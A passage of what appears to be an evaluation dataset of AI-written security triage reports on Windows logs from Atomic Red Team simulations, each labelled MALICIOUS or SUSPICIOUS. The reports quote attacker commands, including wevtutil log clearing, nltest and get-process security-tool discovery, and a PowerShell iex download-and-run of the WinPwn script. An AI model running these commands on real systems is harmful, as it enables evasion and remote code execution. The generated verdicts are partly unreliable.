### Assessment:
The combination of these activities suggests an effort to investigate, catalog, and perhaps evade security measures on `Server002`. The clearing of logs, in conjunction with targeted PowerShell queries about security services and indicators of internal reconnaissance, strongly supports a hypothesis of compromise.

### Threat and Risk Analysis:
- The activities logged are consistent with techniques seen in attack life-cycles, such as reconnaissance, defense evasion, and possibly persistence mechanisms preparation.
- If this behavior wasn't documented as part of legitimate administrative or troubleshooting activities, it presents a viable risk that requires immediate containment, investigation, and remediation.

### Resolution:
Based on the findings and the alignment of behaviors with potential indicators of compromise (IoCs), this case should be marked as:

**MALICIOUS**

### Guidance on How to Proceed:
1. **Immediate Containment**:
   - Isolate `Server002` from the network to prevent any potential lateral movement or communication with potential command and control servers.
   - Change all passwords associated with the `admin_test` account and investigate for any unauthorized access.

2. **Investigation**: 
   - Conduct a thorough forensic investigation to trace back the origin of these actions and determine extent of compromise.
   - Review other connected systems for similar patterns indicating a broader campaign.

3. **Remediation**:
   - Restore the system from a known clean backup.
   - Update all security mechanisms, including endpoint protection and apply any missing critical patches.
   - Implement enhanced monitoring and anomaly detection for early identification of aberrant behaviors.

4. **Post-Incident Action**:
   - Conduct a full review of security policies.
   - Strengthen access controls and regularly audit privileged accounts.
   - Provide security awareness training focusing on identifying potential insider threats and security best practices."
System Time Discovery - PowerShell,"After analyzing the log entries provided, I have made several observations regarding the logged events on the Windows host named Server002. Here is a detailed breakdown:

1. **Application Logs**:
   - The log entries for ""edgeupdate"" indicate standard update service activity. The repeated ""Service stopped"" messages are routine and appear benign.


2. **Sysmon Logs**:
   - Multiple `wevtutil` commands executed by the user `SERVER002\\admin_test` are noted, specifically clearing logs for `Application`, `System`, `Security`, and `Windows PowerShell` channels. The commands executed include:
     - `""C:\\Windows\\system32\\wevtutil.exe"" cl Application`
     - `""C:\\Windows\\system32\\wevtutil.exe"" cl System`
     - `""C:\\Windows\\system32\\wevtutil.exe"" cl Security`
     - `""C:\\Windows\\system32\\wevtutil.exe"" cl ""Windows PowerShell""`
   - The deliberate clearing of these logs is a significant indicator of potentially malicious activity, as it is commonly associated with an attempt to remove traces of compromising actions.
   
   - An instance of `powershell.exe` was run with the command `Get-Date`, which by itself isn't indicative of malicious activity but should be considered in the context of other suspicious activities.

3. **Security Logs**:
   - Security logs record `EventID 1102`, indicating that the security event logs have been cleared by the user `admin_test`. This action is another strong indication of reduced accountability and possible malicious intent.

4. **System Logs**:
   - System logs also contain entries for `EventID 104`, showing that system logs were cleared by `admin_test`. This further corroborates suspicious behavior as part of effort to obfuscate activity on the server.

5. **PowerShell Logs**:
   - The logs indicate regular starting of different PowerShell providers and a typical usage scenario involving fetching the current date with `Get-Date`. However, given other suspicious activities, further investigation into PowerShell scripts executed on this machine could be warranted.

**Assessment**:
Based on the cumulative evidence, especially the clearing of multiple log channels by the same user `SERVER002\\admin_test`, there are strong indicators of malicious activity. This kind of log clearing often signifies attempts to cover tracks after unauthorized activities, possibly involving privilege escalation or offensive techniques.

**Resolution**: **MALICIOUS**
  
**Guidance**:
- Perform a thorough inspection of user `admin_test` and ensure account integrity.
- Review network and system activity surrounding the times in logs to identify any other anomalies.
- Conduct a detailed forensic investigation on Server002 to recover cleared logs, if possible, and identify unauthorized changes.
- Enhance logging and monitoring to catch similar activities in the future. Consider enabling alerting for log-clearing events.
- If unauthorized activities are corroborated, initiate a security protocol to contain, eradicate, and recover from the incident."
Windows Internal pktmon capture,"Upon analyzing the provided logs, several indicators suggest potentially suspicious activity, specifically related to clearing of event logs and unusual processes executed by the user ""admin_test"". Here is a breakdown of the analysis:

### Analysis:

1. **Event Log Clearing:**
   - **System Log Event 104:** The event indicates that the `admin_test` user cleared the System log at `2024-10-22 14:04:03.7016527`.
   - **System Log Event 104:** Followed by clearing the Windows PowerShell log shortly after, at `2024-10-22 14:04:04.0325784`.
   - **Security Log Event 1102:** The `admin_test` user also cleared the Security log at `2024-10-22 14:04:03.8923911`.

   Clearing event logs, especially by an administrative user, can be an indicator of malicious intent, as it might be an attempt to cover tracks after unauthorized or malicious activities.

2. **Unusual Command-Line Executions (Sysmon Logs):**
   - Multiple instances of `wevtutil.exe` were executed to clear log files (`Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, and `Windows PowerShell`). The tool `wevtutil.exe` is a legitimate tool used for managing event logs, but its use in rapid succession to clear logs resembles attempts to hide activity.
   
3. **Privilege Escalation:**
   - **Security Log Event 4672:** The `admin_test` user was assigned privileges, including SeDebugPrivilege, which is often abused for privilege escalation. While not inherently malicious, acquiring such a set of privileges is a red flag, especially in conjunction with log clearing events.

4. **Usage of `cmd.exe` with Potentially Malicious Commands:**
   - **Cmd.exe Execution:** The command line includes starting `PktMon.exe` with suspicious parameters for packet monitoring/logging, with a subsequent command to `stop` the process, indicating the intent to capture and then cover tracks (`TIMEOUT /T 5`).

5. **Excessive Use of System Utilities:**
   - Execution of commands like `hostname.exe`, `whoami.exe`, and multiple instances of `conhost.exe` indicates administrative actions, possibly to gather system information or execute scripts.

6. **Microsoft Edge Update Process:**
   - The logs showed background activity for Microsoft Edge updates suggesting routine operations. However, since they do not relate to the aforementioned suspicious activities, they appear benign.

### Conclusion:

Based upon the analysis of log clearing, use of `wevtutil.exe`, potentially malicious `cmd.exe` command sequences, and the acquisition of extensive privileges, the activities recorded are highly **SUSPICIOUS**. This behavior aligns with potential malicious activity often associated with data exfiltration or system compromise efforts but isn't conclusively malicious given the context from the logs alone. Further investigation is needed to determine the full scope and intent of these actions.

### Recommendations:

- **Immediately audit the `admin_test` account** for any unauthorized changes or use of elevated privileges.
- **Investigate the system for any unauthorized installation**, configuration changes, or traces of malicious entry.
- **Enable enhanced logging and monitoring**, especially for critical security events and account activities, to prevent and identify further such occurrences.
- **Conduct a system forensic analysis** to uncover any other hidden malicious indicators that may not be evident from the present logs.

The resolution is thus: **SUSPICIOUS**."
Griffon Recon,"Upon analyzing the provided Windows event logs for Server002, several indicators of potential malicious activity stand out, warranting a classification of the situation. Below is a detailed analysis and assessment:

### Analysis of Logs and Indicators of Potential Malicious Activity:

1. **Log File Clearance:**
   - The security log contains an event (EventID 1102) indicating the security log was cleared by user ""admin_test"" on Server002 at `2024-10-23 17:35:09.5883659`. 
   - The system log similarly shows log clearance events (EventID 104) for both the system log and Windows PowerShell log at around the same time.
   - Clearing of logs is a significant indicator of suspicious activity as it might be an attempt to erase evidence of malicious actions.

2. **PowerShell Usage:**
   - There are multiple PowerShell logs which indicate the execution of a script (`griffon_recon.vbs` located in a path associated with Atomic Red Team, a known adversarial simulation platform) via PowerShell at `2024-10-23 17:35:10.6726371`.
   - The use of PowerShell scripts from temporary directories, especially those related to Atomic Red Team, is indicative of a benign red team exercise or potentially malicious recon activity simulating attacker behavior.

3. **Sysmon Events:**
   - Sysmon logs show multiple executions of the `wevtutil.exe` tool, which is used to clear event logs. Various process IDs indicate that the security, system, and application logs were cleared using this tool.
   - Windows PowerShell execution invoking scripts from temp directories also aligns with potential malicious recon activity.
   - Standard system utilities like `whoami.exe`, `hostname.exe`, and the execution of console hosts (`conhost.exe`) are presented, which are commonly seen in reconnaissance or living-off-the-land (LotL) attack techniques.

4. **Context of Known Tools:**
   - The reference to Atomic Red Team in PowerShell log entries suggests the possibility of a red team exercise, though the activities being undisturbed without documented permission or notification can transition its classification to suspicious.

### Assessment and Recommendation:

Based on the indicators:

- The combination of cleared event logs, PowerShell script execution related to Atomic Red Team, and the presence of commands typically used in reconnaissance operations strongly suggest potentially malicious or simulated adversarial activity.
- **Resolution: SUSPICIOUS** - The activities do not definitively confirm a malicious breach due to the possible benign nature of Atomic Red Team exercises. However, without explicit consent for such simulations in place, this merits further investigation.

### Recommended Actions:

1. **Immediate Investigation:**
   - Confirm with the security team or management if there has been authorized red teaming or IT exercises involving Atomic Red Team tools around the specified time.
   - Analyze user account ""admin_test"" activities, including any external communications or connections, for anomalies.

2. **Enhanced Monitoring:**
   - Implement stricter monitoring of PowerShell and event log activities to detect similar executions and log clearances in real time.
   - Ensure Sysmon configuration is tuned to detect and alert on the use of `wevtutil.exe` and unexpected script execution.

3. **Security Measures:**
   - Consider deploying advanced endpoint detection and response (EDR) solutions to better detect and respond to similar suspicious activities.
   - Review and reinforce logging policies to prevent unauthorized log clearances and ensure retention for forensic purposes.

By taking these measures, you can ensure a better understanding of the incident's context and put controls in place to prevent potential malicious activities."
Windows - Discover domain trusts with nltest,"Based on the analysis of the provided Windows event logs, several indicators suggest potentially malicious activity:

1. **Command-Line Execution**: Observing ""cmd.exe"" being executed with unusual parameters, specifically:
   - `cmd.exe /c WHERE nltest.exe >NUL 2>&1`: This command is attempting to find the location of `nltest.exe` quietly.
   - `cmd.exe /c nltest /domain_trusts & nltest /trusted_domains`: This command is used to query domain trusts and trusted domains, which might be indicative of reconnaissance activity.

2. **Clearing of Event Logs**: The Security (Event ID 1102), System (Event ID 104), and Windows PowerShell logs were cleared. Clearing event logs is a known tactic used by attackers to cover their tracks after performing malicious activities.

3. **Wevtutil.exe Activity**: 
   - The presence of `wevtutil.exe` with the `cl Microsoft-Windows-Sysmon/Operational` command-line indicates an attempt to clear specific event logs. `Wevtutil` is often misused by attackers to delete traces from logs.

4. **High Integrity Level Processes**: Multiple processes were initiated under a high integrity level, which may suggest privilege escalation.

5. **Usage of Utilities with Potential For Misuse**: Execution of legitimate utilities like `hostname.exe`, `whoami.exe`, and `nltest.exe` noticed multiple times in a short period, especially `nltest`, which was used to check domain trusts, commonly leveraged in lateral movement or enumeration.

6. **Microsoft Edge Update Processes**: Numerous executions related to Microsoft Edge Update were observed. While this may be legitimate, the frequency and batch of these operations could suggest misuse or camouflage.

### Conclusion

Based on the analysis:
- The presence of reconnaissance commands (`nltest` usage), efforts to clear Windows event logs following suspicious activities using `wevtutil`, and high integrity level usage all point collectively towards potentially malicious behavior.

### Resolution: MALICIOUS

Remote System Discovery - arp,"Upon reviewing the provided logs, the following observations and findings are made:

### Observations:

1. **Sysmon Events:**
   - The logs show various usages of the `wevtutil.exe` command-line utility with the parameters `cl` (clear logs) for multiple log channels including `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, and `Security`. This behavior is suspicious as clearing event logs can be an attempt to cover tracks after malicious activities.
   - The command execution comes from a user `admin_test` at high integrity levels, indicating administrative permissions are being used.
   - Commands `whoami` and `cmd.exe /c arp -a` are executed, which could be reconnaissance activities to gather user and network information.
   - There are numerous related instances of `conhost.exe` which typically is seen as a legitimate process; however, in conjunction with the `wevtutil` activity, it raises suspicion.

2. **Security Logs:**
   - Event ID 1102 is logged, indicating that the Security log was cleared by `admin_test`. This action aligns with the `wevtutil cl` activities observed in Sysmon logs.
   - Multiple logs show NTLM logon processes, which might be legitimate depending on the environment, but given the context, they warrant scrutiny due to possible unauthorized access.
   
3. **System Logs:**
   - Event log 104 also shows logs being cleared. The clearing of logs including key channels like the Windows PowerShell is a red flag indicating possible malicious intent.

4. **Application and PowerShell Logs:**
   - The logs for these channels appear to be non-existent or cleared based on the context provided in the System and Security logs.

5. **Edge Update Activities:**
   - The logs capture Windows update processes for Microsoft Edge and Malware definitions, which appear routine and expected for a system maintaining updates. These do not directly suggest malicious activities.

### Assessment:
The logs display a pattern often associated with malicious activity. The frequent use of `wevtutil` to clear logs by an administrative user, alongside reconnaissance commands, points towards potential nefarious activity, possibly an attempt by an attacker to erase their tracks on the system.

### Identified Risks:
- **Log Clearing:** Clearing Security, System, and other event logs typically indicates an attempt to prevent detection of unauthorized or malicious activity.
- **High Integrity Level Execution:** Execution of system utilities with high integrity suggests administrative level access was potentially gained and leveraged for such activities.
- **Reconnaissance:** Running commands like `whoami` and `arp -a` within a short time after clearing logs suggests gathering information possibly for lateral movement or privilege escalation.

### Conclusion:
Based on the evidence found in the logs, the activities clearly denote intentions typical of malicious behavior, primarily focusing on covering tracks post-compromise, which includes clearing logs and running reconnaissance commands.

### Resolution:
**MALICIOUS** - The activities observed are indicative of malicious intent given the sequence of events and actions performed.

Security Software Discovery - powershell,"Upon analyzing the provided logs, here are the notable observations:

1. **PowerShell Activity:**
   - Multiple PowerShell logs indicate the execution of commands aimed at identifying security and antivirus products running on the system. The use of `get-process` in this manner suggests someone or something is attempting to identify if certain antivirus or security monitoring software is present:
     ```
     powershell.exe & {get-process | ?{$_.Description -like ""*virus*""}
     get-process | ?{$_.Description -like ""*carbonblack*""}
     get-process | ?{$_.Description -like ""*defender*""}
     get-process | ?{$_.Description -like ""*cylance*""}
     get-process | ?{$_.Description -like ""*mc*""}
     get-process | ?{$_.ProcessName -like ""*mc*""}
     get-process | Where-Object { $_.ProcessName -eq ""Sysmon"" }}
     ```

2. **Log Clearing Events:**
   - System and Security logs have been cleared by the user `admin_test`. This is a red flag as log clearing is typically an action taken to hide malicious activity.

3. **Anomalous Time Change:**
   - The Security logs show an event for a system time change. This could indicate an attempt to manipulate time-based logs or bypass time-restricted policies.
   - Kernel-General and Security logs show a rapid back-and-forth time change which is not typical of normal operations.

4. **Unusual Process Activity:**
   - Commands were executed using `wevtutil.exe` to clear event logs for channels including Windows PowerShell, System, and Security. This action was performed by `admin_test` and is consistent with attempting to cover tracks.
   - Execution of `sysmon` was mentioned, looking for processes named ""Sysmon,"" which suggests an attempt to determine if Sysmon monitoring is active.

Based on the above findings, there is substantial evidence of suspicious activity on the machine, particularly indicative of anti-forensic behavior (such as clearing logs and detecting security tools). 

**Resolution: MALICIOUS**

**Threats/Risks Identified:**

List Google Chrome - Edge Chromium Bookmarks on Windows with command prompt,"Upon analyzing the provided logs from the Windows host, there are several aspects to address:

### Observations:
1. **Frequent Use of `wevtutil.exe`:**
   - Multiple instances of `wevtutil.exe` being executed by the `admin_test` user to clear logs (e.g., with command lines such as `wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`).
   - This activity often stands out in security contexts, as log clearance can be indicative of an attempt to cover up tracks after malicious activities.

2. **Commands Run via `cmd.exe`:**
   - The execution of `cmd.exe` with the command `where /R C:\Users\ Bookmarks` may suggest attempts to locate sensitive files or configurations.
   - While not inherently malicious, without further context, it raises a suspicion, especially when combined with log clearance.

3. **Standard Software and Updates:**
   - Activity related to Windows Defender, Windows Update (e.g., `MpCmdRun.exe`), and Edge updates appears routine and typical of a system under normal maintenance conditions.

4. **System Cleanup:**
   - Multiple event logs have been cleared (e.g., System and Security logs). Log clearance is generally associated with attempts to obfuscate activities on a system.

5. **High Integrity Processes:**
   - Processes were run with high integrity levels, indicative of possible privilege elevation, which requires more context but is not inherently suspicious alone.

### Assessment:
- While the execution of legitimate Windows processes and maintenance utilities (like Windows Defender updates and Edge updates) is evident, the cleaning of logs combined with searching for files using `where.exe` without additional context is unusual.
- The use of `wevtutil.exe` to clear logs in rapid succession raises a red flag, as this behavior aligns with potential malicious activity patterns often observed in post-exploitation scenarios.

### Resolution:
- **SUSPICIOUS** - The activity involving explicit log clearing without clear justification, combined with command executions, suggests actions that could warrant further investigation.
  
### Guidance:
- Conduct a thorough investigation to understand the context in which these commands were run, and identify if they were part of legitimate maintenance or an operational task.
- Verify the legitimacy of the `admin_test` user's actions and permissions, potentially reviewing recent changes or abnormal login patterns.
- Check the system for any persistence mechanisms or additional signs of compromise.
- Consider tightening logging policies and implementing alerting for critical events such as log clearance in real time to prevent unnoticed malicious activities.

Given the evidence at hand, the described actions suggest possible priorities to reassess the host for ongoing issues or to confirm benign operational intentions."
Basic Permission Groups Discovery Windows (Local),"Based on the provided Windows event logs, here is a detailed analysis of each log type:

### Application Log Analysis
1. **EdgeUpdate Events**: The logs show the stopping of a service named ""edgeupdate"" multiple times. There is no additional context, but frequent stopping of services can sometimes indicate configuration issues or interference with updates. However, stopping and starting update services isn't inherently suspicious without other malicious indicators.
   
2. **Software Protection Platform Service (SPP)**: The log indicates regular operation of the Software Protection Platform, related to license management. There is no evidence of tampering or unauthorized changes.

### System Log Analysis
1. **Log File Cleared (EventID 104)**: The system log indicates that admin_test cleared logs from the System and Windows PowerShell channels. This action can indicate an attempt to cover tracks, especially if no legitimate reason was provided for this log clearing.
   
2. **Windows Update Client (EventID 19)**: This entry marks a routine update for Microsoft Defender Antivirus. No issues are detected here; updates are crucial for maintaining security hygiene.
   
3. **Time Change Events (EventID 4616)**: The logs show changes to system time. These are typically benign if associated with legitimate time synchronization tasks.

### Sysmon Log Analysis
1. **Executable Launches**: There are multiple entries for processes like `whoami.exe`, `cmd.exe`, `net.exe`, and `wevtutil.exe` being executed by `admin_test`. The use of `cmd.exe` with `net localgroup` commands, especially querying the Administrators group, can be suspicious if not part of regular activity.
   
2. **Clear Logs with Wevtutil**: The pattern of using `wevtutil.exe` to clear logs (as directly seen in application clearing via `cl Application`, `cl System`, etc.) by `admin_test` suggests a cover-up attempt, a tactic often used post-compromise to erase cybersecurity audit trails.

### Security Log Analysis
1. **Log Clearance (EventID 1102)**: Critical security logs show that `admin_test` cleared the security event logs. This is a significant red flag suggesting intentional log cleaning, which is often utilized by threat actors post-intrusion.
   
2. **Group Membership Enumeration (EventID 4799)**: The event concerning the checking or possibly modifying of the 'Administrators' user group by `admin_test` could be legitimate for administrative tasks but is concerning in conjunction with other findings, such as log deletion and unauthorized command executions.

### Conclusion
From the evidence and behaviors observed:
- **Repeated log file clearing by `admin_test` without a documented legitimate procedure or authorization**.
- **Usage of commands (`whoami`, `cmd /c net localgroup`) that, while innocuous on their own, appear suspicious in conjunction with log clearance**.
- **The combination of actions points toward intentional obfuscation and potential unauthorized privilege investigation or escalation activities**.

### Resolution
Based on these observations and the seriousness of cleared logs, this activity is classified as **MALICIOUS**. Immediate action should include:
- Isolating the host to prevent further potential malicious activity.
- Conducting a full forensic analysis of the host to examine the extent of unauthorized activities.
- Reviewing user permissions and activities of `admin_test` for exposure or compromise paths.
- Reinforcing logging mechanisms and alert systems to better capture unauthorized changes and potentially malicious activities in the future."
WinPwn - Powersploits privesc checks,"Based on the analysis of the provided Windows event logs, the following suspicious and potentially malicious activities have been identified:

### Analysis of Log Entries:

1. **System Log:**
   - There are multiple Event ID 104 entries indicating that the event logs have been cleared by the user `admin_test`. This action is often carried out to cover tracks and can be a significant indicator of suspicious activity.

2. **Windows PowerShell Log:**
   - The PowerShell logs show the execution of a script using `iex(new-object net.webclient).downloadstring(...)` which is downloading and running a script from a public GitHub repository (`S3cur3Th1sSh1t/WinPwn`). This kind of operation, especially from a non-trusted source, is a strong indicator of malicious activity. The execution of downloaded scripts from the internet can be used to exploit vulnerabilities or download further malicious software.

3. **Sysmon Log:**
   - Several executions of `wevtutil.exe` are observed, which align with the log clearing in the system logs. The `wevtutil.exe` utility is used here to clear various logs, including System, Application, and Security logs. This behavior is inline with potential log tampering to hide malicious actions.
   - The execution of PowerShell scripts with a similar pattern to those logged in PowerShell logs, where web client is used to fetch possibly malicious scripts, suggests an attempt to persist or execute potentially harmful actions.

4. **Application Log:**
   - Activities related to EdgeUpdate seem regular and benign, but the frequency and timing could warrant further inspection when correlated with other suspicious activities.

5. **Security Log:**
   - Event ID 1102 confirms that the Security log has been cleared by the same user, `admin_test`, reinforcing the possibility of an attempt to conceal actions.

### Assessment:

The combination of cleared event logs, the automatic download and execution of an external script from the internet, and clearing of security logs strongly indicate a potentially malicious incident. The user ‘admin_test’ is associated with these actions, showing an attempt to obscure operations on this system.

### Resolution:

- **MALICIOUS**: The activities recorded in the log files are considered malicious due to:
  - Clear evidence of PowerShell script execution from an untrusted source.
  - Log clearing from the system to potentially hide tracks.
  
### Guidance on Actions to Proceed:

1. **Immediate Isolation:**
   - Isolate the affected system (Server002) from the network to prevent further damage or lateral movement within the network.

2. **Forensic Analysis:**
   - Perform a full forensic investigation on Server002 including memory analysis to collect potential indicators of compromise (IoCs).

3. **Account Review:**
   - Investigate the `admin_test` account activity across other systems to determine the extent of compromise. Change credentials or suspend the account if unauthorized use is confirmed.

4. **Incident Response:**
   - Enhance monitoring for similar patterns across the network. Look for further PowerShell or event log clearing activities.
   - Based on findings, make operational adjustments to System Information Event Management (SIEM) rules to alert on such patterns in the future.

5. **Patch and Update:**
   - Ensure that all systems are up to date with security patches to mitigate any exploited vulnerabilities.

This breach demonstrates potentially sophisticated use of built-in Windows utilities and scripting capabilities to attempt undetected access or damage, suggesting the involvement of an experienced threat actor."
WinPwn - itm4nprivesc,"Based on the provided logs, I've identified several activities that are indicative of potential malicious actions. Here's a detailed breakdown:

1. **Event Log Clearing:**
   - The logs contain multiple instances of event logs being cleared (EventID 104 in the System log and EventID 1102 in the Security log). The user account ""admin_test"" cleared logs related to the System, Windows PowerShell, and Security channels. This behavior might be an attempt to cover tracks and is often associated with malicious activities.

2. **Suspicious PowerShell Activity:**
   - Sysmon logs highlight a PowerShell process execution with a command line that includes downloading and executing a script from ""https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1"". This is a clear indication of potentially unauthorized or malicious script execution, as it is trying to fetch and run a script from an external source which could be used for privilege escalation or other forms of exploitation.

3. **Use of Wevtutil for Log Clearance:**
   - The Sysmon logs show that `wevtutil.exe` is being used to clear the event logs. Wevtutil is a legitimate tool, but its use to clear logs, particularly around suspicious activities, is a common tactic used by attackers to remove traces of their actions.

4. **External Network Connections:**
   - The network connections made by PowerShell to download scripts are indicators of potential command and control communication or downloading of malicious software.

5. **Integrity Level and Command Execution Context:**
   - Processes are running with high integrity levels under the context of ""admin_test"", indicating administrative privileges are being used, further supporting a scenario of privilege misuse or escalation.

**Assessment:**
- Given the activities observed, such as the clearing of event logs, the execution of potentially malicious PowerShell scripts from an external source, and the general context of the actions performed (using high privilege operations to clear logs and masks activities), these logs show a clear indication of malicious activity.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
1. **Immediate containment:** Isolate the affected system from the network to prevent further propagation or data exfiltration.
2. **Detailed forensic analysis:** Conduct a thorough examination of the machine's state, including memory analysis, to determine the full scope of the compromise.
3. **Review and Audit:** Check other systems and users for similar malicious activity patterns and access anomalies. Strengthen log monitoring and alerting based on this incident.
4. **Credential reset:** Reset the credentials for ""admin_test"" and all accounts that may have been compromised or used during this incident.
5. **Patch and Harden Environment:** Ensure all systems are updated and any discovered vulnerabilities are remediated. Implement stricter privilege management and network segmentation to limit damage from future incidents.
6. **Post-Incident Review:** Conduct a post-mortem to improve incident response strategies and security infrastructure based on the lessons learned from this incident."
Qakbot Recon,"Based on the provided Windows event logs, here's the detailed analysis:

### Analysis:

1. **Event Log Clearing (EventID 1102 and 104):**
   - Multiple instances of the event log clearing were observed, performed by the user `admin_test` using the `wevtutil.exe` command. Event IDs 1102 in the Security log and 104 in the System log indicate that the logs for Security, System, and Windows PowerShell were cleared.
   - Log clearing is typically associated with an attempt to hide potentially malicious activity, especially if it is not a routine administrative action.

2. **Command Line Utility Execution (Sysmon EventID 1 and 5):**
   - The events show execution of `wevtutil.exe` to clear logs, `whoami.exe`, `nslookup.exe`, `ipconfig.exe`, `net.exe`, etc., and running a potentially malicious batch script (`qakbot.bat`) from a temporary directory.
   - While some of these commands can have legitimate uses, the combination of `wevtutil.exe` to clear logs and the running of scripts from temporary directories can be indicative of script-based malware or lateral movement.

3. **Elevation of Privileges (Security EventID 4672):**
   - Privilege escalation was identified with the account `admin_test` being granted a list of sensitive privileges including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others.
   - These privileges are often used by attackers post-compromise for lateral movement or persistence.

4. **Semi-Suspicious Logon Activities (Security EventID 4624):**
   - There were successful logons with `LogonType 3` (Network logon) from a local account, suggesting possible remote access.
   - Note that these are concurrent with the use of powerful privileges and execution of the mentioned commands which could indicate unauthorized access.

5. **Installation of Software (Sysmon EventID 1):**
   - Several instances of the Edge installer setup execution are visible. While this should be investigated for legitimacy, given the other suspicious activities, this could be part of an effort to download or install unwanted software.

6. **Atomic Red Team Testing:**
   - The path in the logs indicates the use of Atomic Red Team scripts, specifically referencing a part of the script showed `qakbot.bat`. These are part of a security testing framework that simulates attack techniques as part of adversary emulation.
   - If unauthorized, this might symbolize an adversary's actions using already known threat simulation tools.

### Assessment:
The combination of events such as log clearing, execution of network discovery and configuration utilities, privilege escalation, and reference to a possible Qakbot-related script collectively points towards suspicious activity on the host.

### Resolution:

**SUSPICIOUS** - Given the context and the sequence of events, this activity is suspicious but not definitively malicious. The behavior warrants further investigation to determine the intent behind these actions and if the Atomic Red Team activities were sanctioned for testing purposes.

### Guidance on Proceeding:

1. **Immediate Action:**
   - Conduct a thorough investigation to determine if the Atomic Red Team activities were authorized.
   - Check for any unauthorized access or accounts and any external communication from the host.

2. **Log and Monitor:**
   - Reinstate and monitor logging to ensure that any unauthorized activities are captured.
   - Review all security configurations and access controls on the affected system.

3. **Forensic Analysis:**
   - Carry out deeper forensic analysis on the host to trace the origin and extent of any suspicious activity, including file system and network connections review.

4. **Communication and Mitigation:**
   - Communicate with the relevant teams if any further unauthorized or malicious activity is suspected.
   - Take steps to investigate and potentially isolate the host while the investigation is ongoing to prevent further compromise."
Automated AD Recon (ADRecon),"Upon reviewing the provided event logs, several indicators point towards potentially malicious activities:

1. **Event Log Clearing**: Numerous `wevtutil` commands were executed to clear event logs (`Event ID 104` in System logs and `Event ID 1102` in Security logs). This activity is often associated with malicious intent to cover tracks or prevent forensic analysis. The user `admin_test` executed these commands, suggesting possible unauthorized use of administrative privileges.

2. **Suspicious PowerShell Activity**: The execution of PowerShell with `Invoke-Expression` and execution of `ADRecon.ps1` implies the possibility of reconnaissance or collection of Active Directory data. This was executed by `admin_test`, showing potential misuse of admin credentials for sensitive queries or scanning.

3. **ADRecon.ps1 Execution**: The script found in the PowerShell logs is a known tool for Active Directory reconnaissance attacks. Its presence is a strong indicator of an attempt to gather information about the network environment and its users for possible exploitation.

4. **Multiple Systems and Security Privileges Granted**: There are multiple `4624` and `4672` logs showing successful logins and privileges assigned to `SYSTEM` and `admin_test`, with privileges including `SeDebugPrivilege`, `SeTcbPrivilege`, and others that allow access to sensitive operations and system functions. While these can be part of legitimate system operations, in combination with other activities, they suggest potential misuse.

5. **Logon Types and Privileges**: Logon Type 5 (Service) and various high-level privileges suggest elevated access potentially gained through service account manipulation or compromise.

6. **Taskhost Executions**: Various tasks such as `taskhostw.exe` were executed under NT AUTHORITY\SYSTEM, which might be legitimate but could also be leveraged for persistence or further compromise if initiated by a malicious source.

Based on the provided logs, the collective evidence suggests malicious activity. The key indicators include event log tampering, PowerShell misuse, execution of known malicious reconnaissance tools, and unusual assignment of elevated privileges.

Resolution: **MALICIOUS**

### Guidance for Next Steps:
- **Immediate Containment**: Disable the `admin_test` account and any accounts exhibiting unusual activity. Investigate the source of the credentials used for unauthorized actions.
- **Full System Review**: Conduct a thorough check of the system for additional signs of compromise, including malware or other malicious scripts.
- **Network Inspection**: Review network logs to detect any unauthorized external connections or data exfiltration attempts.
- **Enhance Monitoring**: Increase monitoring of PowerShell activity, privilege assignments, and unusual log clearing events across systems.
- **Incident Response**: Engage the incident response team to perform a deeper forensic analysis of the impacted systems and potentially involved systems within the network."
WinPwn - winPEAS,"After thoroughly analyzing the provided Windows event logs, several suspicious activities were identified:

### 1. **PowerShell Activity**:
- The PowerShell logs reveal the execution of a script from a GitHub repository, specifically downloading and executing `WinPwn.ps1`. This script is referenced from a potentially suspicious user or group `S3cur3Th1sSh1t`.
- The `winPEAS` tool is a known enumeration script often used by attackers for privilege escalation and system reconnaissance, executed with non-interactive and console output flags.

### 2. **Log File Clearing**:
- Multiple log files, including the Windows PowerShell, System, and Security logs, have been cleared. This is a red flag as attackers often clear logs to cover their tracks post-compromise.

### 3. **Unusual Processes and Commands**:
- The use of `wevtutil.exe` to clear logs programmatically is observed, initiated by the user `admin_test`. The `wevtutil` is a command-line utility for managing Windows event logs, and its usage here is suspicious.

### 4. **Privilege Execution and Process Hierarchy**:
- High integrity-level processes executed by `admin_test` suggest elevated privileges were obtained or misused.
- The parent process chain culminating in `powershell.exe` operation is suspicious, given its origin and execution context.

### 5. **Time Manipulation**:
- There is evidence of time adjustment events, which while not inherently malicious, can correlate with attempts to alter logs or event timestamps.

### Assessment
Based on the logs and identified activities, it's clear that these actions are indicative of malicious activity aimed at reconnaissance, potential privilege escalation, and cover-up post-execution.

### Resolution
**MALICIOUS** - The activities observed are characteristic of an unauthorized intrusion, where threat actors have downloaded and executed potentially harmful PowerShell scripts, cleared logs, and possibly tampered with timestamps.

### Guidance & Next Steps:
1. **Immediate Containment**:
   - Disconnect the affected host from the network to prevent further exfiltration or lateral movement.
2. **Detailed Forensic Analysis**:
   - Perform a deeper forensic investigation on the host to trace back actions and changes made by the unauthorized scripts.
3. **Review Administrative Accounts**:
   - Investigate the `admin_test` account for unauthorized access or privilege escalation.
4. **Patch and Update**:
   - Ensure all systems and applications are updated to the latest security patches to prevent exploitation.
5. **Rebuild Affected Systems**:
   - Consider rebuilding the affected server to ensure complete remediation.
6. **Enhance Monitoring**:
   - Implement more sophisticated monitoring for PowerShell script executions and log file manipulations.

This incident clearly demonstrates potentially severe unauthorized activities, and immediate action is advised to mitigate risks and preserve evidence for future analysis."
System Service Discovery - net.exe,"Upon reviewing the provided log entries for the Windows host, several aspects of the logs hint at potential malicious activity:

### Analysis of Logs:
1. **Security Log Event 1102** - This event indicates that the security log was cleared, which is often a tactic used by malicious actors to erase their tracks after compromising a system. The user involved in the log-clearing action is `admin_test`, which shows a higher level of privilege was used.

2. **Logon Events and Privilege Use**:
   - **4624 (Successful Logon)** and **4672 (Special Logon)** events show that the user `admin_test` logged in with elevated privileges that include `SeDebugPrivilege`, `SeImpersonatePrivilege`, and others that allow significant control over the system. The presence of such privileges and their use are common in privilege escalation scenarios often leveraged in attacks.

3. **Log File Clearing** (Sysmon and Security Log):
